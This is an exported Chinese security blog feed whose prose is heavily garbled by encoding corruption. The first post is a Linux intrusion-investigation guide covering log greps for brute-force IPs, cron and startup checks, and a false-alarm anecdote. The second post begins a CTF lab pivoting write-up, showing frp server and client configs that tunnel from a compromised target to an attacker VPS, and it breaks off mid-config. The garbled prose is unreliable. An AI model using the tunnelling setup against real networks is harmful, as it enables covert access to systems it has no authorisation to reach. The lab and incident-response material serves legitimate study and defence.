<p><strong>tipsï¼šå¦‚ä½•è®¾ç½®è¯¦ç»†è®°å½•å‘½ä»¤ï¼Ÿ</strong><br>ä¸ºå†å²çš„å‘½ä»¤å¢åŠ ç™»å½•çš„IPåœ°å€ã€æ‰§è¡Œå‘½ä»¤æ—¶é—´ç­‰ä¿¡æ¯ï¼š<br>1ï¼‰ä¿å­˜1ä¸‡æ¡å‘½ä»¤ sed -i â€˜s&#x2F;^HISTSIZE&#x3D;1000&#x2F;HISTSIZE&#x3D;10000&#x2F;gâ€™ &#x2F;etc&#x2F;profile<br>2ï¼‰åœ¨&#x2F;etc&#x2F;profileçš„æ–‡ä»¶å°¾éƒ¨æ·»åŠ å¦‚ä¸‹è¡Œæ•°é…ç½®ä¿¡æ¯ï¼š<br>######jiagu history xianshi#########<br>USER_IP&#x3D;<code>who -u am i 2&gt;/dev/null | awk &#39;&#123;print $NF&#125;&#39; | sed - e &#39;s/[()]//g&#39;</code><br>if [ â€œ$USER_IPâ€ &#x3D; â€œâ€ ]<br>then USER_IP&#x3D;<code>hostname</code><br>fi export HISTTIMEFORMAT&#x3D;â€%F %T $USER_IP <code>whoami</code> â€œ<br>shopt -s histappend<br>export PROMPT_COMMAND&#x3D;â€history -aâ€<br>######### jiagu history xianshi ##########<br>3ï¼‰source &#x2F;etc&#x2F;profileè®©é…ç½®ç”Ÿæ•ˆ ç”Ÿæˆæ•ˆæœï¼š 1 2018-07-10 19:45:39 192.168.204.1 root source &#x2F;etc&#x2F;profile</p>
<h3 id="è¿›ç¨‹å’Œç«¯å£æ’æŸ¥"><a href="#è¿›ç¨‹å’Œç«¯å£æ’æŸ¥" class="headerlink" title="è¿›ç¨‹å’Œç«¯å£æ’æŸ¥"></a>è¿›ç¨‹å’Œç«¯å£æ’æŸ¥</h3><p>1ã€ä½¿ç”¨ netstat ç½‘ç»œè¿æ¥å‘½ä»¤ åˆ†æå¯ç–‘ç«¯å£ã€ipã€PID<br>å‘½ä»¤ï¼šnetstat -antlp | more   &#x2F;&#x2F; ç›´æ¥ç«¯å£ çŠ¶æ€ è¿æ¥ip ä¸€ç›®äº†ç„¶ï¼<br>2ã€ è¿›ç¨‹ä¸»è¦æŸ¥çœ‹æœ‰æ²¡æœ‰é«˜å ç”¨ã€æœ‰æ²¡æœ‰å’Œå¤–éƒ¨é€šä¿¡ã€æœ‰æ²¡æœ‰ä¸è®¤è¯†çš„ç¨‹åº å‘½ä»¤ï¼šps aux</p>
<h3 id="å¼€æœºå¯åŠ¨é¡¹"><a href="#å¼€æœºå¯åŠ¨é¡¹" class="headerlink" title="å¼€æœºå¯åŠ¨é¡¹"></a>å¼€æœºå¯åŠ¨é¡¹</h3><table>
<thead>
<tr>
<th>è¿è¡Œçº§åˆ«</th>
<th>å«ä¹‰</th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>å…³æœº</td>
</tr>
<tr>
<td>1</td>
<td>å•ç”¨æˆ·æ¨¡å¼</td>
</tr>
<tr>
<td>2</td>
<td>ä¸å®Œå…¨çš„å‘½ä»¤è¡Œæ¨¡å¼</td>
</tr>
<tr>
<td>3</td>
<td>å®Œå…¨çš„å‘½ä»¤è¡Œæ¨¡å¼</td>
</tr>
<tr>
<td>4</td>
<td>ç³»ç»Ÿä¿ç•™</td>
</tr>
<tr>
<td>5</td>
<td>å›¾å½¢æ¨¡å¼</td>
</tr>
<tr>
<td>6</td>
<td>é‡å¯åŠ¨</td>
</tr>
</tbody></table>
<p>æŸ¥çœ‹å½“å‰è¿è¡Œå‡»åˆ«å‘½ä»¤ï¼šrunlevel<br>ç³»ç»Ÿé»˜è®¤å…è®¸çº§åˆ«ï¼švi &#x2F;etc&#x2F;inittab<br>id&#x3D;3ï¼šinitdefault ç³»ç»Ÿå¼€æœºåç›´æ¥è¿›å…¥å“ªä¸ªè¿è¡Œçº§åˆ«<br>å¼€æœºå¯åŠ¨é…ç½®æ–‡ä»¶<br>&#x2F;etc&#x2F;rc.local &#x2F;etc&#x2F;rc.d&#x2F;rc[0~6].d<br>ä¾‹å­:å½“æˆ‘ä»¬éœ€è¦å¼€æœºå¯åŠ¨è‡ªå·±çš„è„šæœ¬æ—¶ï¼Œåªéœ€è¦å°†å¯æ‰§è¡Œè„šæœ¬ä¸¢ åœ¨&#x2F;etc&#x2F;init.dç›®å½•ä¸‹ï¼Œç„¶ååœ¨&#x2F;etc&#x2F;rc.d&#x2F;rc*.dä¸­å»ºç«‹è½¯é“¾æ¥å³å¯ </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@localhost ~] <span class="built_in">ln</span> -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh </span><br></pre></td></tr></table></figure>
<p>æ­¤å¤„sshdæ˜¯å…·ä½“æœåŠ¡çš„è„šæœ¬æ–‡ä»¶ï¼ŒS100sshæ˜¯å…¶è½¯é“¾æ¥ï¼ŒSå¼€å¤´ä»£è¡¨åŠ  è½½æ—¶è‡ªå¯åŠ¨ï¼›å¦‚æœæ˜¯Kå¼€å¤´çš„è„šæœ¬æ–‡ä»¶ï¼Œä»£è¡¨è¿è¡Œçº§åˆ«åŠ è½½æ—¶éœ€è¦å…³é—­ çš„ã€‚<br>æŸ¥çœ‹å¯åŠ¨é¡¹æ–‡ä»¶ä¸€äº›å‘½ä»¤ï¼š </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">more /etc/rc.local </span><br><span class="line">more /etc/rc.d/rc[0~6].d   </span><br><span class="line"><span class="built_in">ls</span> -l /etc/rc[0-6].d/</span><br></pre></td></tr></table></figure>
<p>å¤‡æ³¨ï¼šä¸€èˆ¬åœ¨ä¸Šè¿°æ–‡ä»¶å¤¹ä¸‹çš„æœåŠ¡ ç¨‹åºéƒ½éœ€è¦æ³¨æ„ã€‚</p>
<h3 id="å®šæ—¶ä»»åŠ¡"><a href="#å®šæ—¶ä»»åŠ¡" class="headerlink" title="å®šæ—¶ä»»åŠ¡"></a>å®šæ—¶ä»»åŠ¡</h3><p>åŸºæœ¬ä½¿ç”¨ï¼šåˆ©ç”¨crontab åˆ›å»ºè®¡åˆ’ä»»åŠ¡<br>åŸºæœ¬å‘½ä»¤ï¼šcrontab -l åˆ—å‡ºæŸä¸ªç”¨æˆ·cronæœåŠ¡çš„è¯¦ç»†å†…å®¹   Tipsï¼šé»˜è®¤ç¼–å†™çš„crontabæ–‡ä»¶ä¼šä¿å­˜åœ¨ (&#x2F;var&#x2F;spool&#x2F;cron&#x2F;ç”¨æˆ·å ä¾‹ å¦‚: &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root<br>crontab -r åˆ é™¤æ¯ä¸ªç”¨æˆ·crontä»»åŠ¡(è°¨æ…ï¼šåˆ é™¤æ‰€æœ‰çš„è®¡åˆ’ä»»åŠ¡)<br>crontab -e ä½¿ç”¨ç¼–è¾‘å™¨ç¼–è¾‘å½“å‰çš„crontabæ–‡ä»¶<br>ä½¿ç”¨æ¡ˆä¾‹ä¹‹æ¯å¤©è¿è¡Œ&#x2F;home&#x2F;backup.shè„šæœ¬ï¼š<br>vi &#x2F;etc&#x2F;anacrontab @daily 10 example.daily &#x2F;bin&#x2F;bash &#x2F;home&#x2F;backup.sh<br>å½“æœºå™¨åœ¨ backup.sh æœŸæœ›è¢«è¿è¡Œæ—¶æ˜¯å…³æœºçš„ï¼Œanacronä¼šåœ¨æœºå™¨å¼€æœºå åˆ†é’Ÿä¹‹åè¿è¡Œå®ƒï¼Œè€Œä¸ç”¨å†ç­‰å¾… 7å¤©ã€‚<br>å…¥ä¾µæ’æŸ¥ ã€<br>é‡ç‚¹å…³æ³¨ä»¥ä¸‹ç›®å½•ä¸­æ˜¯å¦å­˜åœ¨æ¶æ„è„šæœ¬ </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/var/spool/cron/* </span><br><span class="line">/etc/crontab </span><br><span class="line">/etc/cron.d/* </span><br><span class="line">/etc/cron.daily/* </span><br><span class="line">/etc/cron.hourly/* </span><br><span class="line">/etc/cron.monthly/* </span><br><span class="line">/etc/cron.weekly/ </span><br><span class="line">/etc/anacrontab </span><br><span class="line">/var/spool/anacron/* </span><br><span class="line"><span class="comment">#å°æŠ€å·§ï¼š more /etc/cron.daily/* æŸ¥çœ‹ç›®å½•ä¸‹æ‰€æœ‰æ–‡ä»¶</span></span><br></pre></td></tr></table></figure>

<h3 id="æœåŠ¡æ’æŸ¥"><a href="#æœåŠ¡æ’æŸ¥" class="headerlink" title="æœåŠ¡æ’æŸ¥"></a>æœåŠ¡æ’æŸ¥</h3><p>** æœåŠ¡è‡ªå¯åŠ¨çš„è®¾ç½® **<br>ç¬¬ä¸€ç§ä¿®æ”¹æ–¹æ³•ï¼š<br>chkconfig [â€“level è¿è¡Œçº§åˆ«] [ç‹¬ç«‹æœåŠ¡å] [on|off]<br>chkconfig â€“level 2345 httpd on å¼€å¯è‡ªå¯åŠ¨<br>chkconfig httpd on ï¼ˆé»˜è®¤levelæ˜¯2345ï¼‰<br>ç¬¬äºŒç§ä¿®æ”¹æ–¹æ³•ï¼š<br>ä¿®æ”¹&#x2F;etc&#x2F;re.d&#x2F;rc.local æ–‡ä»¶<br>åŠ å…¥ &#x2F;etc&#x2F;init.d&#x2F;httpd start<br>ç¬¬ä¸‰ç§ä¿®æ”¹æ–¹æ³•ï¼š<br>ä½¿ç”¨ntsysvå‘½ä»¤ç®¡ç†è‡ªå¯åŠ¨ï¼Œå¯ä»¥ç®¡ç†ç‹¬ç«‹æœåŠ¡å’ŒxinetdæœåŠ¡ã€‚<br>** æœåŠ¡çš„æ’æŸ¥ **<br>1ã€æŸ¥è¯¢å·²å®‰è£…çš„æœåŠ¡<br>RPM åŒ…å®‰è£…çš„æœåŠ¡ï¼<br>chkconfig   â€“list æŸ¥çœ‹æœåŠ¡è‡ªå¯åŠ¨çŠ¶æ€ï¼Œå¯ä»¥çœ‹åˆ°æ‰€æœ‰çš„RPMåŒ…å®‰è£…çš„æœåŠ¡<br>ps aux | grep crond æŸ¥çœ‹å½“å‰æœåŠ¡<br>ç³»ç»Ÿå†3ä¸5çº§åˆ«ä¸‹çš„å¯åŠ¨é¡¹<br>2ã€æºç åŒ…å®‰è£…çš„æœåŠ¡<br>æŸ¥çœ‹æœåŠ¡å®‰è£…ä½ç½®ï¼Œä¸€èˆ¬å®åœ¨&#x2F;user&#x2F;local&#x2F;<br>service httpd start<br>æœç´¢&#x2F;etc&#x2F;rc.d&#x2F;init.d&#x2F; æŸ¥çœ‹æ˜¯å¦å­˜åœ¨ï¼</p>
<h3 id="æ—¥å¿—åˆ†æ"><a href="#æ—¥å¿—åˆ†æ" class="headerlink" title="æ—¥å¿—åˆ†æ"></a>æ—¥å¿—åˆ†æ</h3><p>è¿™é‡Œæ˜¯å…¥ä¾µæ’æŸ¥æœ€é‡è¦çš„ä¸œè¥¿ï¼Œä¸€èˆ¬æœ‰webæ—¥å¿—å’Œç³»ç»Ÿæ—¥å¿—ï¼Œwebæ—¥å¿—æˆ‘è¿™é‡Œæ²¡æœ‰ï¼Œå› ä¸ºæˆ‘ä¸ºäº†å®‰å…¨æ‰€æœ‰çš„webéƒ½åœ¨dockeré‡Œé¢ï¼Œæ‰€ä»¥æˆ‘è¿™é‡Œä¸»è¦å°±æ˜¯ç³»ç»Ÿæ—¥å¿—ã€‚è€Œä¸”å‰é¢çš„æ’æŸ¥æˆ‘ä¹Ÿæ²¡æ’æŸ¥å‡ºä»€ä¹ˆä¸œè¥¿ã€‚</p>
<p>** æ—¥å¿—æ–‡ä»¶çš„æè¿° **<br>æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š &#x2F;var&#x2F;log&#x2F;<br>æŸ¥çœ‹æ—¥å¿—é…ç½®æƒ…å†µï¼š more &#x2F;etc&#x2F;rsyslog.conf</p>
<table>
<thead>
<tr>
<th>æ—¥å¿—æ–‡ä»¶</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>&#x2F;var&#x2F;log&#x2F;cron</td>
<td>è®°å½•ç³»ç»Ÿå®šæ—¶ä»»åŠ¡ç›¸å…³æ—¥å¿—</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;cups</td>
<td>è®°å½•æ‰“å°ä¿¡æ¯çš„æ—¥å¿—</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;dmesg</td>
<td>è®°å½•ç³»ç»Ÿå¼€æœºæ—¶å†…æ ¸è‡ªæ£€ä¿¡æ¯</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;mailog</td>
<td>è®°å½•é‚®ä»¶ä¿¡æ¯</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;message</td>
<td>è®°å½•ç³»ç»Ÿé‡è¦ä¿¡æ¯æ—¥å¿—ï¼Œç³»ç»Ÿå‡ºç°é—®é¢˜æ—¶çš„é¦–è¦æ£€æŸ¥è¿™ä¸ªæ—¥å¿—</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;btmp</td>
<td>è®°å½•é”™è¯¯ç™»é™†æ—¥å¿—ï¼Œæ­¤æ—¥å¿—æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œlastbå‘½ä»¤æŸ¥çœ‹</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;lastlog</td>
<td>è®°å½•ç³»ç»Ÿç§æ‰€æœ‰ç”¨æˆ·æœ€åä¸€æ¬¡ç™»é™†äº‹ä»¶çš„æ—¥å¿—ï¼ŒäºŒè¿›åˆ¶æ–‡ä»¶ï¼ŒlastlogæŸ¥çœ‹</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;wtmp</td>
<td>æ°¸ä¹…è®°å½•æ‰€æœ‰ç”¨æˆ·çš„ç™»é™†ã€æ³¨é”€ä¿¡æ¯ï¼ŒåŒæ—¶è®°å½•ç³»ç»Ÿçš„é‡å¯ã€å…³æœºã€å¯åŠ¨äº‹ä»¶ã€‚äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç”¨lastæŸ¥çœ‹</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;utmp</td>
<td>è®°å½•å½“å‰å·²ç»ç™»é™†çš„ç”¨æˆ·ä¿¡æ¯ï¼Œåªè®°å½•æˆ¿å‰ç™»é™†ç”¨æˆ·çš„ä¿¡æ¯ï¼Œw å‘½ä»¤æŸ¥çœ‹</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;secure</td>
<td>è®°å½•éªŒè¯å’Œæˆæƒæ–¹é¢çš„ä¿¡æ¯ï¼Œæ¯”å¦‚sshã€suã€sudoç™»é™†è¿˜æœ‰æ·»åŠ ä¿®æ”¹è´¦æˆ·å¯†ç ç­‰ï¼Œä¹Ÿæ˜¯åº”æ€¥å“åº”ç§çš„é‡ç‚¹æ’æŸ¥å¯¹è±¡</td>
</tr>
<tr>
<td>&#x2F;var&#x2F;log&#x2F;auth.log*</td>
<td>åŒä¸Šï¼Œubuntuä¸‹çš„å®‰å…¨æ—¥å¿—</td>
</tr>
</tbody></table>
<p>#æ³¨æ„ï¼Œä¸€ä¸ªç³»ç»Ÿå¯èƒ½å¹¶ä¸æ‹¥æœ‰ä¸Šé¢è¡¨æ ¼ä¸­çš„æ‰€æœ‰æ—¥å¿—ï¼Œæ¯”å¦‚ubuntuä¸Šè¿°æ—¥å¿—å°±æœ‰å¾ˆå¤šæ²¡æœ‰ï¼Œè¿™å’Œè®¾ç½®ä¸ç³»ç»Ÿç‰ˆæœ¬æœ‰å…³ï¼Œæ‰€ä»¥å…¥ä¾µæ’æ’æŸ¥ï¼Œåº”è¯¥å…ˆç¡®å®šåŸæ¥æœ‰å“ªäº›æ—¥å¿—ï¼Œæ—¥å¿—æœ‰æ²¡æœ‰è¢«åˆ é™¤ã€‚</p>
<p>** æ—¥å¿—åˆ†ææŠ€å·§ **<br>1ã€å®šä½æœ‰å¤šå°‘IPå†çˆ†ç ´ä¸»æœºçš„rootè´¦å·</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep <span class="string">&quot;Failed password for root&quot;</span> /var/log/syslog | awk <span class="string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -nr | more</span><br></pre></td></tr></table></figure>
<p>æ³¨æ„ ubuntu åœ¨auth.log æ‰€ä»¥å¯èƒ½æœ‰çš„æœåŠ¡å™¨ ç™»é™†æ—¥å¿—ä¹Ÿåœ¨auth.log<br>2ã€å®šä½æœ‰å“ªäº›ipåœ¨çˆ†ç ´</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep <span class="string">&quot;Failed password for root&quot;</span> /var/log/syslog | awk <span class="string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -nr | more</span><br><span class="line">æ³¨æ„ ubuntu åœ¨auth.log æ‰€ä»¥å¯èƒ½æœ‰çš„æœåŠ¡å™¨ ç™»é™†æ—¥å¿—ä¹Ÿåœ¨auth.log</span><br><span class="line">3ã€çˆ†ç ´ç”¨æˆ·ç”¨çš„å­—å…¸æ˜¯ä»€ä¹ˆ</span><br><span class="line">â€‹```bash</span><br><span class="line">grep <span class="string">&quot;Failed password&quot;</span> /var/log/secure|perl -e <span class="string">&#x27;while($_= &lt;&gt;)&#123; /for(.*?) from/; print&quot;$1\n&quot;;&#125;&#x27;</span>|<span class="built_in">uniq</span> -c|<span class="built_in">sort</span> -nr</span><br></pre></td></tr></table></figure>
<p>æ³¨æ„ ubuntu åœ¨auth.log æ‰€ä»¥å¯èƒ½æœ‰çš„æœåŠ¡å™¨ ç™»é™†æ—¥å¿—ä¹Ÿåœ¨auth.log<br>4ã€ç™»é™†æˆåŠŸçš„ipæœ‰å“ªäº›ï¼Ÿ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep <span class="string">&quot;Accepted &quot;</span> /var/log/secure | awk <span class="string">&#x27;&#123;print $11&#125;&#x27;</span> | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -c | <span class="built_in">sort</span> -nr | more</span><br></pre></td></tr></table></figure>
<p>æ³¨æ„ ubuntu åœ¨auth.log æ‰€ä»¥å¯èƒ½æœ‰çš„æœåŠ¡å™¨ ç™»é™†æ—¥å¿—ä¹Ÿåœ¨auth.log<br>5ã€ç™»é™†æˆåŠŸçš„æ—¥æœŸ ç”¨æˆ·å IP</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grep <span class="string">&quot;Accepted &quot;</span> /var/log/secure | awk <span class="string">&#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>æ³¨æ„ ubuntu åœ¨auth.log æ‰€ä»¥å¯èƒ½æœ‰çš„æœåŠ¡å™¨ ç™»é™†æ—¥å¿—ä¹Ÿåœ¨auth.log<br>6ã€å¢åŠ ä¸€ä¸ªç”¨æˆ·kaliæ—¥å¿—</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001 Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali , shell=/bin/bash Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed <span class="keyword">for</span> kali <span class="comment">#grep &quot;useradd&quot; /var/log/secure</span></span><br></pre></td></tr></table></figure>
<p>7ã€åˆ é™¤ä¸€ä¸ªç”¨æˆ·kaliæ—¥å¿—ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Jul 10 00:14:17 localhost userdel[2393]: delete user <span class="string">&#x27;kali&#x27;</span> Jul 10 00:14:17 localhost userdel[2393]: removed group <span class="string">&#x27;kali&#x27;</span> owned by <span class="string">&#x27;kali&#x27;</span> Jul 10 00:14:17 localhost userdel[2393]: removed shadow group <span class="string">&#x27;kali&#x27;</span> owned by <span class="string">&#x27;kali&#x27;</span> <span class="comment"># grep &quot;userdel&quot; /var/log/secure</span></span><br></pre></td></tr></table></figure>
<p>8ã€sudoæˆæƒæ‰§è¡Œ</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -l Jul 10 00:43:09 localhost sudo: good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now</span><br></pre></td></tr></table></figure>
<h3 id="æˆ‘çš„æœåŠ¡å™¨ï¼ˆä¹Œé¾™ï¼‰"><a href="#æˆ‘çš„æœåŠ¡å™¨ï¼ˆä¹Œé¾™ï¼‰" class="headerlink" title="æˆ‘çš„æœåŠ¡å™¨ï¼ˆä¹Œé¾™ï¼‰"></a>æˆ‘çš„æœåŠ¡å™¨ï¼ˆä¹Œé¾™ï¼‰</h3><p>é‡ç‚¹æ¥äº†ï¼Œæˆ‘åšäº†ä¸Šè¿°çš„æ‰€æœ‰æ£€æŸ¥ï¼Œæ¯”å¯¹&#x2F;etc&#x2F;passwd æ²¡å‘ç°å˜åŠ¨ï¼Œcronæ²¡æœ‰ä»»ä½•æ–°æ·»åŠ çš„å®šæ—¶ä»»åŠ¡ï¼ŒæœåŠ¡æ²¡æœ‰æ²¡è§è¿‡çš„æœåŠ¡ï¼Œè€Œä¸”æˆ‘çš„webæœåŠ¡å…¨åœ¨dockerï¼Œå¼€æœºå¯åŠ¨é¡¹å’ŒæœåŠ¡è‡ªå¯åŠ¨ä¹Ÿæ²¡æœ‰é—®é¢˜ã€‚</p>
<p>ç›´åˆ°æ—¥å¿—æ’æŸ¥ï¼Œæˆ‘å‘ç°ä¸€ä¸ªipåœ¨æˆ‘å‡ºå·®çš„æ—¶å€™ç™»é™†äº†æˆ‘çš„é˜¿é‡Œäº‘ï¼Œipå®šä½æ˜¯çŸ³å®¶åº„ï¼Œå¯æˆ‘ä»æ²¡å»è¿‡çŸ³å®¶åº„ï¼Œæˆ‘ä¹Ÿä¸æ˜¯çŸ³å®¶åº„çš„ï¼Œç„¶åæˆ‘å°±å¼€å§‹è­¦è§‰ï¼ŒæŸ¥è¯¢æ—¥å¿—å‘ç°è¯¥ipæ²¡æœ‰çˆ†ç ´ï¼Œä¸€æ¬¡ç™»é™†ã€‚éœ‡æƒŠï¼æˆ‘çš„å¯†ç å¯æ˜¯10ä½å¤§å°å­—æ¯åŠ æ•°å­—å’Œç‰¹æ®Šå­—ç¬¦æ··åˆå‡ºæ¥çš„ã€‚æŸ¥çœ‹å†å²å‘½ä»¤ï¼Œæ‰§è¡Œäº†ä¸€ä¸ªlsï¼Œç„¶åå°±æ²¡æœ‰äº†ï¼Œæˆ‘åˆšå¼€å§‹æ€€ç–‘æ˜¯ä»–åˆ é™¤äº†æ—¥å¿—å’Œå†å²å‘½ä»¤ï¼Œäºæ˜¯å»æŸ¥çœ‹ç³»ç»Ÿæœ‰æ²¡æœ‰åé—¨ï¼Œæ’æŸ¥äº†ä¸€åœˆï¼Œæ²¡æœ‰ä»»ä½•æœåŠ¡å‡ºç½‘åˆ°å¯ç–‘çš„ipã€‚</p>
<p>æ— æœåæˆ‘å°±é—®äº†ä¸‹ä¸€ä¸ªå¤§ä½¬ï¼Œä»–è¯´ä½ çš„æ‰‹æœºæ˜¯ä¸æ˜¯æ²³åŒ—çš„ï¼Œæ˜¯ä¸æ˜¯å¼€çƒ­ç‚¹äº†ã€‚äºæ˜¯æˆ‘å‘ç°æˆ‘è™½ç„¶ä¸æ˜¯çŸ³å®¶åº„çš„ä½†æ˜¯æˆ‘çš„è”é€šçƒ­ç‚¹çš„å‡ºå£æ˜¯çŸ³å®¶åº„ï¼Œé‚£ä¹ˆä¸€åˆ‡å°±è§£é‡Šæ¸…æ¥šäº†ã€‚å“ï¼Œç™½å¿™æ´»äº†ä¸‰ä¸ªå°æ—¶ã€‚</p>
<p>ä¸è¿‡è¿™äº›åŸºç¡€çš„æ’æŸ¥è¿˜æ˜¯å†™å‡ºæ¥ä¾›å¤§å®¶å‚è€ƒå§ï¼å…¶å®å¾ˆå¤šæˆ‘ä¹Ÿæ˜¯é€šè¿‡ç½‘ä¸Šå­¦ä¹ çš„ï¼</p>
]]></content>
      <categories>
        <category>å†…ç½‘å®‰å…¨</category>
      </categories>
      <tags>
        <tag>æœåŠ¡å™¨å®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title>CFSä¸‰å±‚é¶åœºçš„ç©¿é€å®è·µ</title>
    <url>//posts/CFS%E4%B8%89%E5%B1%82%E9%9D%B6%E5%9C%BA%E7%9A%84%E7%A9%BF%E9%80%8F%E5%AE%9E%E8%B7%B5/</url>
    <content><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å†ä¸€æ¬¡CTFæ¯”èµ›ä¸­é‡åˆ°äº†ä¸‰å››å±‚ç©¿é€çš„é¶åœºï¼Œå½“æ—¶ç”±äºæ²¡æœ‰å¤–ç½‘ï¼Œè€Œä¸”ä¹Ÿä¸çŸ¥é“ä»€ä¹ˆç½‘ç»œåŸå› å¯¼è‡´ç©¿é€ä¸‰å±‚çš„æ—¶å€™ä¸€ç›´æ²¡æˆåŠŸã€‚è¿™ä¸ªå‡æœŸæ­£å¥½æœ‰æ—¶é—´å°±æ‰¾äº†ä¸€ä¸ªé¶åœºï¼Œçœ‹çœ‹å¤šå±‚çš„ç©¿é€åˆ°åº•åº”è¯¥æ€ä¹ˆæ¥æ¯”è¾ƒæ–¹ä¾¿ã€‚</p>
<p>é¶åœºé€‰å–çš„æ˜¯CFSä¸‰å±‚é¶åœºï¼Œç½‘ä¸Šä¸€æœå°±æœ‰ï¼Œè¿™é‡Œä¸å†æä¾›ä¸‹è½½é“¾æ¥äº†ã€‚</p>
<h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><h3 id="ç½‘ç»œç¯å¢ƒ"><a href="#ç½‘ç»œç¯å¢ƒ" class="headerlink" title="ç½‘ç»œç¯å¢ƒ"></a>ç½‘ç»œç¯å¢ƒ</h3><p>è¿™é‡Œæ˜¯ä¸‰å±‚ç½‘ç»œç¯å¢ƒï¼Œè®¾ç½®äº†ä¸‰ä¸ªvmnet: </p>
<p><img data-src="/images/pages/image-20221005202301343.png" alt="image-20221005202301343"></p>
<span id="more"></span>

<h3 id="æ‹“æ‰‘å›¾"><a href="#æ‹“æ‰‘å›¾" class="headerlink" title="æ‹“æ‰‘å›¾"></a>æ‹“æ‰‘å›¾</h3><p><img data-src="/images/pages/image-20221005205842224.png" alt="image-20221005205842224"></p>
<p>æ”»å‡»æ¯”è¾ƒç®€å•ä¸å†èµ˜è¿°ï¼Œè¿™é‡Œä¸»è¦æ˜¯è®°å½•ä¸‹ç©¿é€çš„æ–¹æ¡ˆã€‚æˆ‘ä»¬é»˜è®¤æ‹¿åˆ°äº†æ¯ä¸€å±‚æœºå™¨çš„å‘½ä»¤æ‰§è¡Œæƒé™ã€‚å…¶ä¸­é¶æœº2å’Œé¶æœº3æ˜¯æ— æ³•å‡ºç½‘çš„ã€‚</p>
<h2 id="ç©¿é€å†…ç½‘"><a href="#ç©¿é€å†…ç½‘" class="headerlink" title="ç©¿é€å†…ç½‘"></a>ç©¿é€å†…ç½‘</h2><h3 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h3><h4 id="é¦–å…ˆæ˜¯ä¸€å±‚ç©¿é€"><a href="#é¦–å…ˆæ˜¯ä¸€å±‚ç©¿é€" class="headerlink" title="é¦–å…ˆæ˜¯ä¸€å±‚ç©¿é€"></a>é¦–å…ˆæ˜¯ä¸€å±‚ç©¿é€</h4><p>é¦–å…ˆæˆ‘ä»¬åˆ†åˆ«ä¸Šä¼ frpå·¥å…·åˆ°æˆ‘ä»¬çš„å…¬ç½‘vpså’Œé¶æœº1ï¼Œç„¶åvpsä¸­çš„serverå¦‚ä¸‹è®¾ç½®ï¼š</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># frps.ini</span></span><br><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="attr">bind_port</span> = <span class="number">8700</span></span><br><span class="line"><span class="comment"># å·¥ä½œå°é…ç½®ï¼Œä¸éœ€è¦å¯ä»¥ä¸é…ç½®</span></span><br><span class="line"><span class="attr">dashboard_port</span> = <span class="number">8500</span></span><br><span class="line"><span class="attr">dashboard_user</span> = admin_xxx</span><br><span class="line"><span class="attr">dashboard_pwd</span> = password_788_xxX</span><br></pre></td></tr></table></figure>
<p>åå°å¯åŠ¨</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">nohup</span> ./frps -c frps.ini &amp;</span><br></pre></td></tr></table></figure>



<p>æˆ‘ä»¬æ‹¿åˆ°é¶æœº1çš„æƒé™åä¸Šä¼ frpï¼Œå¹¶è¿›è¡Œå¦‚ä¸‹è®¾ç½®å³å¯ç©¿é€å†…ç½‘ã€‚</p>
<p>frcp.ini</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="comment"># frpc.ini</span></span><br><span class="line"><span class="section">[common]</span></span><br><span class="line"><span class="comment"># æœåŠ¡ç«¯åœ°å€</span></span><br><span class="line"><span class="attr">server_addr</span> = vps_ip_addr</span><br><span class="line"><span class="attr">server_port</span> = <span class="number">8700</span></span><br><span class="line"><span class="attr">tls_enable</span> = ture</span><br><span class="line"></span><br><span class="line"><span class="comment"># 